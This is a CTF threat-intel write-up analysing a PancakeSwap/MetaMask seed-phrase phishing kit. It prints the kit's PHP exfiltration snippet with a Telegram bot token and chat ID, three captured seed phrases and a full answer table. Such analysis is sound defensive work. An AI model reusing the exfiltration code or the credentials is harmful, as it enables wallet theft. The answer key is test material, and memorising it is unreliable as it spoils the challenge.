# CyberDefenders - GrabThePhisher (Threat Intel) Write-up

**Challenge:** [GrabThePhisher](https://cyberdefenders.org/blueteam-ctf-challenges/grabthephisher/)  
**Platform:** [CyberDefenders](https://cyberdefenders.org/)  
**Tags:** Threat intelligence, phishing kit, DeFi, Telegram exfiltration

---

## Summary

A DeFi platform reported unauthorized withdrawals after users hit a **PancakeSwap** impersonation site on a compromised host. Kit analysis shows a **MetaMask** seed-phrase lure (`metamask/` → **`metamask.php`**), **Sypex Geo** victim profiling, local logging to **`log/log.txt`** (**3** victims), and real-time exfil via **Telegram** bot token **`5457463144:AAG...`** to chat **`5442785564`**. Developer signature in kit comments: **`j1j1b1s@m3r0`**.

---

## Scenario

A decentralized finance (DeFi) platform recently reported multiple user complaints about unauthorized fund withdrawals. A forensic review uncovered a phishing site impersonating the legitimate PancakeSwap exchange, luring victims into entering their wallet seed phrases. The phishing kit was hosted on a compromised server and exfiltrated credentials via a Telegram bot.

---

## Objectives

- Analyze the recovered phishing kit (`pankewk.zip` / `metamask/` tree).
- Extract exfiltration mechanics, victim data, and Telegram IOCs.
- Map TTPs for blocking and threat-actor tracking.

---

## Environment

- **Artifacts:** Phishing kit archive (lab ZIP, password `cyberdefenders.org`) — **`pankewk/metamask/`**, **`log/log.txt`**
- **Tools:** Text editor, browser (optional kit preview), Telegram Bot API (`getChat`) for actor enrichment

**Kit layout:**

```text
pankewk/
  metamask/
    index.html      # Fake MetaMask recovery UI
    metamask.php    # Backend: collect, geo, exfil
  log/
    log.txt         # Appended seed phrases
```

---

## Investigation narrative

The attack story is linear: **lure victims with a fake DEX/wallet flow → harvest 12-word seeds → profile the victim → exfil to operator → leave a local copy on the compromised server**. The kit files and **`log.txt`** on disk are the evidence chain.

---

### Phase 1 — Identify the wallet lure (what victims were asked for)

**Story:** PancakeSwap users connect via Web3 wallets. A seed-recovery page that names a specific wallet brand tells us which credential type the operator targeted (full wallet recovery, not just a password).

**What I checked:** **`metamask/index.html`** — form labels, import/recovery wording.

**Evidence:** Page prompts for a **secret recovery phrase / passphrase** to continue to the wallet — branded **MetaMask** flow.

**Reasoning:** MetaMask uses a **12-word BIP-39 seed phrase**. Anything submitted here is sufficient to drain linked accounts — matching the DeFi unauthorized withdrawal reports.

**Finding:** Wallet **`metamask`**

---

### Phase 2 — Locate the collection backend (kit logic)

**Story:** Static HTML alone cannot exfiltrate; the POST handler lives in server-side code on the same path.

**What I checked:** **`metamask/`** directory listing — non-HTML executable server files.

**Evidence:** **`metamask.php`** — functions **`sendTel()`**, reads **`$_POST['data']`**, writes to **`log/log.txt`**, calls Telegram **`sendMessage`** API.

**Reasoning:** Filename mirrors the wallet folder to blend in (`metamask.php` beside **`index.html`**). This is the single backend that turns victim input into operator alerts and disk logs.

**Findings:** Kit file **`metamask.php`** · Language **`php`**

---

### Phase 3 — Victim profiling before exfil (operator situational awareness)

**Story:** Phish operators often log victim country/city/time to prioritize high-value targets or tune social engineering.

**What I checked:** Top of **`metamask.php`** — HTTP client calls on victim visit/submit.

**Evidence:**

```php
// Request to Sypex Geo API
http://api.sypexgeo.net/json/
```

**Reasoning:** **Sypex Geo** resolves client IP to geo/city metadata bundled into the Telegram message — not malware on the victim PC, but a third-party geo service abused by the kit.

**Finding:** **`sypex geo`** (Sypex Geo / api.sypexgeo.net)

---

### Phase 4 — Measure impact (how many wallets were stolen)

**Story:** The compromised server kept a local append-only log as a backup to Telegram. Each line is one victim submission.

**What I checked:** **`log/log.txt`** — count 12-word mnemonic lines.

**Evidence:**

```text
number edge rebuild stomach review course sphere absurd memory among drastic total
bomb stairs satisfy host barrel absorb dentist prison capital faint hedgehog worth
father also recycle embody balance concert mechanic believe owner pair muffin hockey
```

**Reasoning:** MetaMask standard recovery = **12 words** per phrase → **3** distinct victim entries. Last appended line = most recent incident (file opened with **`FILE_APPEND`** in PHP).

**Findings:** Count **`3`** · Latest seed **`father also recycle embody balance concert mechanic believe owner pair muffin hockey`**

---

### Phase 5 — Trace exfiltration (how seeds reached the operator)

**Story:** Telegram gives operators mobile real-time alerts without hosting their own C2 server — common in crypto phish kits.

**What I checked:** **`sendTel()`** in **`metamask.php`** — hard-coded credentials and API URL pattern.

**Evidence:**

```php
$id    = "5442785564";
$token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10";
// https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=...
file_put_contents(.../log/log.txt', $text, FILE_APPEND);
```

**Reasoning:** Dual channel: **Telegram** for instant operator notification, **`log.txt`** for persistence on the hacked web host. Token + chat ID are IOCs for Telegram abuse reports and **`getChat`** enrichment.

**Findings:** Medium **`telegram`** · Token **`5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10`** · Chat ID **`5442785564`**

---

### Phase 6 — Attribute the kit author (signature in source)

**Story:** Kit developers often leave handles in comments — same pattern as web shell signatures.

**What I checked:** Comments / banner text at top of **`metamask.php`**.

**Evidence:** Comment block credits kit allies / author handle **`j1j1b1s@m3r0`**.

**Reasoning:** Leetspeak handle ties this kit instance to a developer persona for cross-case correlation (other kits, forums, Telegram usernames).

**Finding:** Allies / alias **`j1j1b1s@m3r0`**

---

## Attack timeline (reconstructed)

```text
[Victim] visits fake PancakeSwap / MetaMask recovery page
        |
        v
index.html — enter 12-word seed phrase
        |
        v
metamask.php — Sypex Geo enriches victim IP
        |
        +→ Telegram bot (chat 5442785564) — real-time alert
        +→ log/log.txt — local append
        |
        v
Attacker imports seed → unauthorized DeFi withdrawals
```

---

## Lab answers (reference)

| # | Finding | Answer |
|---|---------|--------|
| 1 | Wallet impersonated | **`metamask`** |
| 2 | Kit source file | **`metamask.php`** |
| 3 | Kit language | **`php`** |
| 4 | Victim geo service | **`sypex geo`** |
| 5 | Seeds collected | **`3`** |
| 6 | Most recent seed phrase | **`father also recycle embody balance concert mechanic believe owner pair muffin hockey`** |
| 7 | Exfil medium | **`telegram`** |
| 8 | Bot token | **`5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10`** |
| 9 | Chat ID | **`5442785564`** |
| 10 | Kit developer allies / alias | **`j1j1b1s@m3r0`** |

---

## Key IOCs

| Type | Indicator |
|------|-----------|
| **Lure** | Fake PancakeSwap / MetaMask recovery |
| **Kit path** | `metamask/metamask.php`, `metamask/index.html` |
| **Geo API** | `api.sypexgeo.net` |
| **Local log** | `log/log.txt` |
| **Telegram bot token** | `5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10` |
| **Telegram chat ID** | `5442785564` |
| **Developer handle** | `j1j1b1s@m3r0` |
| **Victim seeds (lab)** | 3 phrases in `log.txt` (treat as compromised — rotate/revoke) |

---

## MITRE ATT&CK

| Technique | Name | In this incident |
|-----------|------|------------------|
| **T1566** | Phishing | Fake DEX / wallet recovery site |
| **T1056** | Input Capture | Seed phrase form |
| **T1071.001** | Web Protocols | HTTP POST to **`metamask.php`** |
| **T1041** | Exfiltration Over C2 Channel | Telegram **`sendMessage`** |
| **T1102** | Web Service | Sypex Geo + Telegram APIs |

---

## Mitigation / Hardening

- Report Telegram bot token to Telegram abuse; monitor chat ID **`5442785564`** in threat feeds.
- Block **`api.sypexgeo.net`** egress from web servers where not required.
- Hunt for **`metamask.php`** + **`log/log.txt`** patterns on compromised hosts (open directories).
- User education: never enter seed phrases on linked pages — only in official wallet apps.
- Contact affected users from **`log.txt`** (IR/legal process) to rotate wallets immediately.

---

## References

- Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/grabthephisher/
- Telegram Bot API: https://core.telegram.org/bots/api#getchat
